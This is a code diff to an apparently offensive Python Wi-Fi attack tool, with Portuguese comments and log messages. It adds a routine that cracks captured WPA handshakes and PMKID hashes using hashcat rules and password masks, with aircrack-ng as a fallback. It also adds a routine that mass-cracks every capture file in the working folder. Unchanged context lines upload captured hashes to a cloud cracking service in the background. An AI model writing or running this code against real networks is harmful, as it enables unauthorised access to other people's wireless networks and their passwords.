@@ -411,17 +411,67 @@ def upload_to_wpa_sec(pcap_file):
     return False
 
 def crack_hash_v7_expert(hash_file, bssid=None):
-    """ Módulo de Cracking Elite: Hashcat com Máscaras e Wordlists """
+    """ Módulo de Cracking Elite: Hashcat com Inteligência de Padrões e Regras """
     if not os.path.exists(hash_file): return
     
-    # Adicionado: Tentativa de Upload para Nuvem em paralelo
+    # Upload para Nuvem em paralelo
     threading.Thread(target=upload_to_wpa_sec, args=(hash_file,), daemon=True).start()
     
     wordlist = "/usr/share/wordlists/rockyou.txt"
-    # ... (resto do código igual)
+    if not os.path.exists(wordlist):
+        wordlist = "/tmp/dsi_expert.txt"
+        with open(wordlist, "w") as f: f.write("12345678\npassword\nadmin123\n")
+        
+    supreme_log(f"MAGISTRADO CRACKER: Iniciando Operação de Inteligência em {hash_file}...", log_type="cmd")
+    
+    # 1. Ataque de Dicionário + Regras (Transforma senhas comuns: ex password -> P4ssw0rd!)
+    if hash_file.endswith(".16800"):
+        # Hashcat com regra best64 (muito eficaz)
+        cmd_rules = f"hashcat -m 16800 -a 0 {hash_file} {wordlist} -r /usr/share/hashcat/rules/best64.rule --force"
+        subprocess.run(cmd_rules, shell=True, stdout=subprocess.DEVNULL)
+    else:
+        # Aircrack não suporta regras complexas nativamente tão bem, foca no dicionário
+        cmd_dict = f"aircrack-ng -w {wordlist} -b {bssid} {hash_file}"
+        subprocess.run(cmd_dict, shell=True, stdout=subprocess.DEVNULL)
+    
+    # 2. Ataques de Máscara (Quebra senhas que NÃO estão no wordlist)
+    if hash_file.endswith(".16800"):
+        masks = [
+            "?d?d?d?d?d?d?d?d",       # 8 dígitos (Datas/Telefones)
+            "?u?l?l?l?l?d?d?d",       # Nome123 (ex: Carlos123)
+            "?d?d?d?d?d?d?d?d?d?d",   # 10 dígitos
+            "202?d?d?d?d"             # Padrão de anos recentes
+        ]
+        for mask in masks:
+            supreme_log(f"MAGISTRADO CRACKER: Testando Máscara Elite: {mask}", log_type="cmd")
+            cmd_mask = f"hashcat -m 16800 -a 3 {hash_file} {mask} --force"
+            subprocess.run(cmd_mask, shell=True, stdout=subprocess.DEVNULL)
+            # Verifica se já quebrou para não perder tempo
+            res, _ = run_command(f"hashcat -m 16800 {hash_file} --show")
+            if res: 
+                supreme_log(f"!!! SUCESSO: Senha extraída via Máscara: {res}", log_type="info")
+                return res
+    return None
+
+def scan_and_crack_all():
+    """ Inteligência Nato: Varre o workspace e tenta quebrar TUDO o que encontrar """
+    supreme_log("MAGISTRADO: Iniciando varredura profunda de arquivos locais...", log_type="cmd")
+    files = os.listdir(".")
+    caps = [f for f in files if f.endswith(".cap")]
+    hashes = [f for f in files if f.endswith(".16800")]
+    
+    total = len(caps) + len(hashes)
+    if total == 0:
+        supreme_log("Nenhum arquivo de captura encontrado para processar.", log_type="error")
+        return
+    
+    supreme_log(f"Encontrados {total} arquivos de captura. Iniciando quebra em massa...", log_type="info")
+    
+    for h in hashes: crack_hash_v7_expert(h)
+    for c in caps: crack_hash_v7_expert(c)
+    supreme_log("Quebra em massa concluída.", log_type="info")
 
 def crack_hash(hash_file, wordlist_file, bssid=None):
-    # Redireciona para o novo módulo expert
     crack_hash_v7_expert(hash_file, bssid)
 
 def capture_pmkid_v6(monitor_interface, bssid, channel, output_file):
